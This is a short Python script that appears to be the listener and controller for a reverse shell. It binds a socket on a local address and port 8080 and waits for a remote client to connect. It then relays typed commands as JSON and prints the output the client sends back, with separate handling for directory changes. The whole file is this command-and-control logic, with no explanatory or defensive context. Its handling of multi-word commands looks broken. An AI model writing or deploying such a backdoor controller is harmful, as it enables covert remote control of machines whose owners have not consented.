import socket
import json
server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
print(" socket is ready ")
server.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
server.bind(("192.168.43.123",8080))
server.listen(0)
print("waiting for connections")
connection, address = server.accept()
print("client is connected", address)

def send_command(command):
    json_data= json.dumps(command)
    connection.send(json_data.encode())
def rec_result():
    json_data = " "
    while True:
        try:
            json_data = json_data + connection.recv(1024).decode()
            return json.loads(json_data)
        except ValueError:
            continue
def send_dir(command):
    json_data= json.dumps(command)
    connection.send(json_data.encode())
def recv_dir():
    json_data =connection.recv(1024).decode()
    print(json_data)


while True:
    command = input(">> ")
    command= command.split(" ")

    if command[0]=="cd" and len(command)>1:
        send_dir(command)
        recv_dir()


    elif len(command)<=1:
        send_command(command)
        result = rec_result()
        print(result)

